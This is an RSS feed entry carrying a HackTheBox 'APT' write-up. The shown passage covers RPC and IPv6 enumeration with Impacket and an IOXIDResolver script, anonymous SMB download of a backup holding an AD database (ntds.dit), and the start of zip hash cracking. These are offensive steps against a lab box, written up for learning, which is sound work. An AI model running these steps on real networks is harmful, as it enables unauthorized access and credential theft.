@@ -1,0 +1,756 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>socat on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/socat/</link>
+    <description>Recent content in socat on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 17 Apr 2021 00:09:51 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/socat/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - APT</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-apt/</link>
+      <pubDate>Sat, 17 Apr 2021 00:09:51 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-apt/</guid>
+      <description>Learn remote computer network interface enumeration via MSRPC and exploiting NTLMv1</description>
+      <content:encoded><![CDATA[<p>APT is an insane difficulty Windows machine from HackTheBox where deep understanding of Windows enumeration and internals is required. It starts with enumeration on RPC services to get a list of MSRPC interfaces. One of the interface called IObjectExporter has a method named <em>ServerAlive()</em> can be abused to reveals the IPv6 address of the machine. There is a share contains a backup file of AD database and it can be extracted to obtain users' hashes. Brute-force attack is performed to obtain one valid credentials from those hashes. With that credentials, I&rsquo;m able to query to the registry to find another set of credentials which can be used to gain a foothold on the system. A PowerShell history reveals that the machine is configured to accept NTLMv1 authentication, which is then exploited to get Administrator access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>RPC enumeration</li>
+<li>Port Forwarding</li>
+<li>Remote Registry</li>
+<li>Exploiting NTLMv1</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
+<li>Impacket - <a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></li>
+<li>IOXIDResolver - <a href="https://github.com/mubix/IOXIDResolver">https://github.com/mubix/IOXIDResolver</a></li>
+<li>smbclient - Preinstalled in Kali Linux</li>
+<li>CrackMapExec - <a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a></li>
+<li>Socat - Preinstalled in Kali Linux</li>
+<li>Evil-WinRM - <a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></li>
+<li>Kerbrute - <a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></li>
+<li>pyKerbrute - <a href="https://github.com/3gstudent/pyKerbrute">https://github.com/3gstudent/pyKerbrute</a></li>
+<li>Responder - <a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap---ipv4">Nmap - IPv4</h3>
+<p>Both the initial scan and full scan with <code>nmap</code> only show two open ports, HTTP with IIS server on port 80, and MSRPC on port 135.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ nmap -sC -sV -oA nmap/initial-apt <span style="color:#e6db74">&#39;10.10.10.213&#39;</span> -v
+
+PORT    STATE SERVICE VERSION
+80/tcp  open  http    Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Gigantic Hosting | Home
+135/tcp open  msrpc   Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 on the browser shows up a website called &ldquo;Gigantic Hosting&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210415055156844.png" alt="image-20210415055156844"  /></div>
+</p>
+<p>The input vectors on <code>https://10.13.38.16/contact-post.html</code> don&rsquo;t appear to be neither vulnerable nor injectable.</p>
+<p><div class="img-container"><img src="imgs/image-20210415061845703.png" alt="image-20210415061845703"  /></div>
+</p>
+<p>It sends a post request with an empty body to a host that can not be resolved by my network.</p>
+<p>Here is the example request.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> https://10.13.38.16/contact-post.html <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">10.13.38.16</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://10.10.10.213/support.html</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">keep-alive</span>
+Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</code></pre></div><h4 id="directory-brute-force---gobuster">Directory Brute Force - Gobuster</h4>
+<p>Nothing really interesting.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ gobuster dir -u http://10.10.10.213/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt
+
+...&lt;SNIP&gt;...
+/images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 150<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/images/<span style="color:#f92672">]</span>
+/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 146<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/js/<span style="color:#f92672">]</span>    
+/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 147<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/css/<span style="color:#f92672">]</span>   
+/news.html            <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5528<span style="color:#f92672">]</span>                                 
+/about.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 9386<span style="color:#f92672">]</span>                                 
+/support.html         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 6326<span style="color:#f92672">]</span>                                 
+/Images               <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 150<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://10.10.10.213/Images/<span style="color:#f92672">]</span>
+/services.html        <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 10592<span style="color:#f92672">]</span>                                
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 14879<span style="color:#f92672">]</span>                                
+/clients.html         <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 12146<span style="color:#f92672">]</span>                                
+</code></pre></div><h3 id="tcp-135---msrpc">TCP 135 - MSRPC</h3>
+<p>Remote Procedure Call (RPC) allows applications to invoke a function (or procedure or subroutine) of a remote computer without having to understand the network’s details, and MSRPC is Microsoft’s enhanced version of <a href="https://en.wikipedia.org/wiki/DCE/RPChttps://en.wikipedia.org/wiki/DCE/RPC">DCE/RPC</a>.</p>
+<p>MSRPC works together with the Distributed Component Object Model (DCOM). DCOM provides a mechanism for exposing application objects and it consists of a set of RPC interfaces that can be implemented over any RPC Transport (think DCOM as object-oriented extension to RPC).</p>
+<p>DCOM and RPC endpoint mapper sit on this port (both of them run on the shared process of <code>svchost.exe</code>). RPC endpoint mapper maintains the <strong>database of endpoints</strong> that clients use to map an interface to endpoints. There is a tool called <code>rpcdump.py</code> from Impacket that can be used to dump those endpoints:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72»
+$ rpcdump.py -port <span style="color:#ae81ff">135</span> <span style="color:#e6db74">&#39;10.10.10.213&#39;</span>
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving endpoint list from 10.10.10.213
+...&lt;SNIP&gt;...
+Protocol: <span style="color:#f92672">[</span>MS-RSP<span style="color:#f92672">]</span>: Remote Shutdown Protocol
+Provider: wininit.exe
+UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
+Bindings:
+          ncacn_ip_tcp:10.10.10.213<span style="color:#f92672">[</span>49664<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>WindowsShutdown<span style="color:#f92672">]</span>
+          ncacn_np:<span style="color:#ae81ff">\\</span>APT<span style="color:#f92672">[</span><span style="color:#ae81ff">\P</span>IPE<span style="color:#ae81ff">\I</span>nitShutdown<span style="color:#f92672">]</span>
+          ncalrpc:<span style="color:#f92672">[</span>WMsgKRpc06C4F0<span style="color:#f92672">]</span>
+...&lt;SNIP&gt;...
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Received <span style="color:#ae81ff">265</span> endpoints.
+</code></pre></div><p>Those <code>ncacn_http</code>, <code>ncacn_np</code>, <code>ncacn_ip_tcp</code> are called as protocol string/protocol sequence. It is the language that a network operating system uses <em>to talk over</em> the network to other computers [<a href="https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=&amp;cad=rja&amp;uact=8&amp;ved=2ahUKEwi8veDouNHwAhVbAXIKHYarCu4QFjAAegQIAhAD&amp;url=https%3A%2F%2Fdocs.microsoft.com%2Fen-us%2Fwindows%2Fwin32%2Frpc%2Fselecting-a-protocol-sequence&amp;usg=AOvVaw14KDvhbl4W2VCPGweUBVzP">source</a>].</p>
+<h4 id="scan-for-listening-rpc-interfaces">Scan for Listening RPC Interfaces</h4>
+<p>With <code>rpcmap.py</code>, also from Impacket, I could get a list of currently listening RPC interfaces that are accessible over TCP.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72»
+$ rpcmap.py <span style="color:#e6db74">&#39;ncacn_ip_tcp:10.10.10.213[135]&#39;</span> -brute-uuid | tee rpc-enum/rpc-services
+
+...&lt;SNIP&gt;...
+Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
+Provider: rpcss.dll
+UUID: 000001A0-0000-0000-C000-000000000046 v0.0
+
+Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
+Provider: rpcss.dll
+UUID: 4D9F4AB8-7D1C-11CF-861E-0020AF6E7C57 v0.0
+
+Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
+Provider: rpcss.dll
+UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
+...&lt;SNIP&gt;...
+
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Tested <span style="color:#ae81ff">354</span> UUID<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>
+</code></pre></div><p>From the results above, three of them are the interfaces provided by DCOM, details of those interfaces are documented by Microsoft in <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/c25391af-f59e-40da-885e-cc84076673e4">well-known UUIDs</a>.</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>GUID</th>
+<th>Purpose</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IID_IRemoteSCMActivator</td>
+<td>{000001A0-0000-0000-C000-000000000046}</td>
+<td>RPC interface UUID for IRemoteSCMActivator</td>
+<td>RemoteSCMActivator is another remote activation interface of the DCOM Remote Protocol.</td>
+</tr>
+<tr>
+<td>IID_IActivation</td>
+<td>{4d9f4ab8-7d1c-11cf-861e-0020af6e7c57}</td>
+<td>RPC interface UUID for IActivation</td>
+<td>IActivation is the DCOM Remote Protocol remote activation interface supported on all versions of the DCOM Remote Protocol</td>
+</tr>
+<tr>
+<td>IID_IObjectExporter</td>
+<td>{99fcfec4-5260-101b-bbcb-00aa0021347a}</td>
+<td>RPC interface UUID for IObjectExporter</td>
+<td>IObjectExporter is the interface used for OXID resolution, pinging, and <strong>server aliveness</strong> tests. All object resolvers MUST support the IObjectExporter interface</td>
+</tr>
+</tbody>
+</table>
+<h4 id="network-interfaces-enumeration">Network Interfaces Enumeration</h4>
+<p>This <a href="https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/">articles</a>, written by Nicolas Delhaye, shows that <code>ServerAlive2()</code> method in IObjectExport (also known as IOXIDResolver) interface can be used to retrieve list of network interfaces of a remote computer. Nicolas also provides the PoC for this.</p>
+<p><div class="img-container"><img src="imgs/image-20210415065746943.png" alt="image-20210415065746943"  title="List of available methods in IObjectExport interface. "  /></div>
+</p>
+<blockquote>
+<p>Opnum is operation number to identify a specific rpc method or a method in an interface.</p>
+</blockquote>
+<p>I can use <code>rpcmap.py</code> with <code>-brute-opnums</code> option to determine which interface methods are accessible.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72»
+$ rpcmap.py -brute-opnums -opnum-max <span style="color:#ae81ff">5</span> <span style="color:#e6db74">&#39;ncacn_ip_tcp:10.10.10.213&#39;</span>
+
+...&lt;SNIP&gt;...
+Protocol: <span style="color:#f92672">[</span>MS-DCOM<span style="color:#f92672">]</span>: Distributed Component Object Model <span style="color:#f92672">(</span>DCOM<span style="color:#f92672">)</span> Remote
+Provider: rpcss.dll
+UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A v0.0
+Opnum 0: rpc_x_bad_stub_data
+Opnum 1: rpc_x_bad_stub_data
+Opnum 2: rpc_x_bad_stub_data
+Opnum 3: success
+Opnum 4: rpc_x_bad_stub_data
+Opnum 5: success
+</code></pre></div><p>Opnum 3 and Opnum 5 show a success message that means access to ServerAlive() is allowed.</p>
+<p>From here, I can use the provided PoC script.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
+
+<span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> getopt
+
+<span style="color:#f92672">from</span> impacket.dcerpc.v5 <span style="color:#f92672">import</span> transport
+<span style="color:#f92672">from</span> impacket.dcerpc.v5.rpcrt <span style="color:#f92672">import</span> RPC_C_AUTHN_LEVEL_NONE
+<span style="color:#f92672">from</span> impacket.dcerpc.v5.dcomrt <span style="color:#f92672">import</span> IObjectExporter
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>(argv):
+
+    <span style="color:#66d9ef">try</span>:
+        opts, args <span style="color:#f92672">=</span> getopt<span style="color:#f92672">.</span>getopt(argv,<span style="color:#e6db74">&#34;ht:&#34;</span>,[<span style="color:#e6db74">&#34;target=&#34;</span>])
+    <span style="color:#66d9ef">except</span> getopt<span style="color:#f92672">.</span>GetoptError:
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>
+        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">2</span>)
+
+    target_ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;192.168.1.1&#34;</span>
+
+    <span style="color:#66d9ef">for</span> opt, arg <span style="color:#f92672">in</span> opts:
+        <span style="color:#66d9ef">if</span> opt <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-h&#39;</span>:
+            <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;IOXIDResolver.py -t &lt;target&gt;&#39;</span>)
+            sys<span style="color:#f92672">.</span>exit()
+        <span style="color:#66d9ef">elif</span> opt <span style="color:#f92672">in</span> (<span style="color:#e6db74">&#34;-t&#34;</span>, <span style="color:#e6db74">&#34;--target&#34;</span>):
+            target_ip <span style="color:#f92672">=</span> arg
+
+    authLevel <span style="color:#f92672">=</span> RPC_C_AUTHN_LEVEL_NONE
+
+    stringBinding <span style="color:#f92672">=</span> <span style="color:#e6db74">r</span><span style="color:#e6db74">&#39;ncacn_ip_tcp:</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> target_ip
+    rpctransport <span style="color:#f92672">=</span> transport<span style="color:#f92672">.</span>DCERPCTransportFactory(stringBinding)
+
+    portmap <span style="color:#f92672">=</span> rpctransport<span style="color:#f92672">.</span>get_dce_rpc()
+    portmap<span style="color:#f92672">.</span>set_auth_level(authLevel)
+    portmap<span style="color:#f92672">.</span>connect()
+
+    objExporter <span style="color:#f92672">=</span> IObjectExporter(portmap)
+    bindings <span style="color:#f92672">=</span> objExporter<span style="color:#f92672">.</span>ServerAlive2()
+
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[*] Retrieving network interface of &#34;</span> <span style="color:#f92672">+</span> target_ip)
+
+    <span style="color:#66d9ef">for</span> binding <span style="color:#f92672">in</span> bindings:
+        NetworkAddr <span style="color:#f92672">=</span> binding[<span style="color:#e6db74">&#39;aNetworkAddr&#39;</span>]
+        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;Address: &#34;</span> <span style="color:#f92672">+</span> NetworkAddr
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+   main(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>:])
+</code></pre></div><p>The script successfully identifies two IPv6 addresses of the box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72» 
+$ ./IOXIDResolver.py -t <span style="color:#e6db74">&#39;10.10.10.213&#39;</span>
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Retrieving network interface of 10.10.10.213
+Address: apt
+Address: 10.10.10.213
+Address: dead:beef::b885:d62a:d679:573f
+Address: dead:beef::89df:c1d4:6aaf:67ce
+</code></pre></div><p>I&rsquo;ll add these addresses to <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72» 
+$ echo <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f apt&#39;</span> &gt;&gt; /etc/hosts
+</code></pre></div><blockquote>
+<p>For me, scanning those two addresses returns the same result.</p>
+</blockquote>
+<h3 id="nmap---ipv6">Nmap - IPv6</h3>
+<p>This time <code>nmap</code> shows the common ports of Active Directory domain controller</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ nmap -6 --min-rate <span style="color:#ae81ff">1000</span> -sC -sV -oA nmap/initial-apt-ipv6 <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f&#39;</span> -v
+
+PORT    STATE SERVICE      VERSION
+53/tcp  open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+80/tcp  open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Gigantic Hosting | Home
+88/tcp  open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2021-04-15 00:36:03Z<span style="color:#f92672">)</span>
+135/tcp open  msrpc        Microsoft Windows RPC
+389/tcp open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Issuer: commonName<span style="color:#f92672">=</span>apt.htb.local
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">2048</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-09-24T07:07:18
+| Not valid after:  2050-09-24T07:17:18
+| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+|_SHA-1: f677 c290 98c0 2ac5 <span style="color:#ae81ff">8575</span> <span style="color:#ae81ff">7060</span> 683d cdbc 5f86 5d45
+|_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time.
+445/tcp open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>
+464/tcp open  kpasswd5?
+593/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>
+| ssl-cert: Subject: commonName<span style="color:#f92672">=</span>apt.htb.local
+| Subject Alternative Name: DNS:apt.htb.local
+| Issuer: commonName<span style="color:#f92672">=</span>apt.htb.local
+| Public Key type: rsa
+| Public Key bits: <span style="color:#ae81ff">2048</span>
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2020-09-24T07:07:18
+| Not valid after:  2050-09-24T07:17:18
+| MD5:   c743 dd92 e928 50b0 aa86 6f80 1b04 4d22
+|_SHA-1: f677 c290 98c0 2ac5 <span style="color:#ae81ff">8575</span> <span style="color:#ae81ff">7060</span> 683d cdbc 5f86 5d45
+|_ssl-date: 2021-04-15T00:38:57+00:00; -1s from scanner time.
+<span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span style="color:#f92672">=</span>7.80%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>4/14%Time<span style="color:#f92672">=</span>60778A78%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>DNSV
+SF:ersionBindReqTCP,20,<span style="color:#e6db74">&#34;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+</span><span style="color:#e6db74">SF:x04bind\0\0\x10\0\x03&#34;</span><span style="color:#f92672">)</span>;
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -12m00s, deviation: 26m48s, median: -1s
+| smb-os-discovery: 
+|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>
+|   Computer name: apt
+|   NetBIOS computer name: APT<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>
+|   Domain name: htb.local
+|   Forest name: htb.local
+|   FQDN: apt.htb.local
+|_  System time: 2021-04-15T01:38:41+01:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-04-15T00:38:39
+|_  start_date: 2021-04-14T16:50:06
+</code></pre></div><p>I&rsquo;ll take notes on</p>
+<ul>
+<li>
+<p>Domain name: <code>htb.local</code></p>
+</li>
+<li>
+<p>FQDN: <code>apt.htb.local</code></p>
+</li>
+<li>
+<p>Host: Windows Server 2016 Standard 14393</p>
+</li>
+</ul>
+<p>Also, according to a full port scan, WinRM is listening on IPv6</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «rpc-enum» «10.10.14.72»
+$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> -6 -v <span style="color:#e6db74">&#39;dead:beef::b885:d62a:d679:573f&#39;</span>
+
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+47001/tcp open  winrm
+49664/tcp open  unknown
+49665/tcp open  unknown
+49666/tcp open  unknown
+49667/tcp open  unknown
+49669/tcp open  unknown
+49670/tcp open  unknown
+49673/tcp open  unknown
+49682/tcp open  unknown
+49691/tcp open  unknown
+</code></pre></div><h3 id="tcp-445---smb-ipv6">TCP 445 - SMB (IPv6)</h3>
+<p>Anonymous access is allowed on SMB. The <code>backup</code> share seems interesting here.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ smbclient -N -L //apt 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        backup          Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share 
+apt is an IPv6 address -- no workgroup available
+</code></pre></div><p>Upon accessing <code>backup</code> share, a backup file named <code>backup.zip</code> is found. I’ll pull it to my Kali.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «apt» «10.10.14.72» 
+$ smbclient -N //apt/backup
+Anonymous login successful
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:52 <span style="color:#ae81ff">2020</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:52 <span style="color:#ae81ff">2020</span>
+  backup.zip                          A <span style="color:#ae81ff">10650961</span>  Thu Sep <span style="color:#ae81ff">24</span> 03:30:32 <span style="color:#ae81ff">2020</span>
+
+                <span style="color:#ae81ff">10357247</span> blocks of size 4096. <span style="color:#ae81ff">6964173</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> get backup.zip 
+getting file <span style="color:#ae81ff">\b</span>ackup.zip of size <span style="color:#ae81ff">10650961</span> as backup.zip <span style="color:#f92672">(</span>502.9 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 502.9 KiloBytes/sec<span style="color:#f92672">)</span>
+</code></pre></div><p>The backup file is protected by a password.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ unzip backup.zip 
+Archive:  backup.zip
+   creating: Active Directory/
+<span style="color:#f92672">[</span>backup.zip<span style="color:#f92672">]</span> Active Directory/ntds.dit password: 
+</code></pre></div><p>I can use <code>zip2john.py</code> to convert this <code>backup.zip</code> into crackable hash format and transfer the hash to my Windows for cracking.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «loot» «10.10.14.72» 
+$ zip2john backup.zip &gt; backup.zip.hash
+→ root@iamf «loot» «10.10.14.72» 
+$ cat backup.zip.hash 
